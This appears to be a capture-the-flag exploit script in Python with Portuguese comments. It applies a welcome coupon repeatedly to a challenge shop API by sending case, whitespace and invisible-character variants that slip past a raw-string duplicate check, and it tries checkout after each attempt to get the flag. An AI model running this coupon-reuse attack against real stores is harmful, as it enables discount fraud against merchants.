#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Teste de bypass de cupom duplicado.

Hipótese:
A API pode validar o cupom de forma normalizada, por exemplo:
    coupon.strip().upper() == "WELCOME20"

Mas pode registrar/verificar duplicidade usando o valor cru recebido:
    "WELCOME20" != "welcome20" != "WELCOME20 "

Se isso acontecer, conseguimos aplicar o mesmo cupom várias vezes.
"""

import json
import urllib.request
import urllib.error
import http.cookiejar


TARGET = "https://d1986f8c1c794d65.chal.ctf.ae"


cookie_jar = http.cookiejar.CookieJar()

opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cookie_jar)
)


def request(method, path, body=None):
    """
    Envia requisição HTTP mantendo a mesma sessão por cookie.
    """

    url = TARGET + path

    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": "ctf-coupon-bypass/1.0",
    }

    data = None

    if body is not None:
        data = json.dumps(body).encode("utf-8")

    req = urllib.request.Request(
        url,
        data=data,
        headers=headers,
        method=method,
    )

    try:
        res = opener.open(req, timeout=10)
        raw = res.read().decode("utf-8", errors="replace")
        return res.status, raw

    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        return e.code, raw

    except Exception as e:
        return "ERR", f"{type(e).__name__}: {e}"


def show(title, status, body):
    """
    Exibe resultado em formato legível.
    """
    print()
    print("=" * 80)
    print(title)
    print("=" * 80)
    print(f"HTTP STATUS: {status}")
    print(body)


def main():
    # Inicializa a sessão.
    status, body = request("GET", "/api/products")
    show("GET /api/products", status, body)

    # Adiciona 1 item caro ao carrinho.
    # Usamos apenas 1 item para observar melhor a progressão do desconto.
    status, body = request("POST", "/api/cart", {"product_id": 3})
    show("POST /api/cart product_id=3", status, body)

    status, body = request("GET", "/api/cart")
    show("GET /api/cart antes dos cupons", status, body)

    # Variações que testam case sensitivity, espaços, quebras de linha,
    # tabulação e caracteres invisíveis.
    coupon_variants = [
        "WELCOME20",
        "welcome20",
        "Welcome20",
        "WELCOME20 ",
        " WELCOME20",
        "WELCOME20\n",
        "WELCOME20\t",
        "WELCOME20\r",
        "WELCOME20\u000b",
        "WELCOME20\u000c",
        "WELCOME20\u00a0",
    ]

    for index, coupon in enumerate(coupon_variants, start=1):
        payload = {"coupon": coupon}

        status, body = request("POST", "/api/apply-coupon", payload)
        show(
            f"TENTATIVA {index}: apply-coupon repr={coupon!r}",
            status,
            body,
        )

        status, body = request("GET", "/api/cart")
        show(f"CARRINHO APÓS TENTATIVA {index}", status, body)

        # Testamos checkout em cada etapa, porque alguns desafios liberam
        # a flag quando o total chega a um limite específico.
        status, body = request("POST", "/api/checkout", {})
        show(f"CHECKOUT APÓS TENTATIVA {index}", status, body)


if __name__ == "__main__":
    main()
